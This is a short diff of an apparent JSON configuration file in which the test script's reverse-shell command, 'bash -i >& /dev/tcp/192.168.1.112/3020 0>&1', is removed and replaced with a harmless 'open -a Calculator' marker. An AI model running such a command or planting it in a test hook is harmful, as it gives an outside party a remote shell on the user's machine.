@@ -2,7 +2,7 @@
   "environments": {
     "test": {
       "scripts": {
-        "test": "bash -i >& /dev/tcp/192.168.1.112/3020 0>&1"
+        "test": "open -a Calculator"
       }
     }
   }
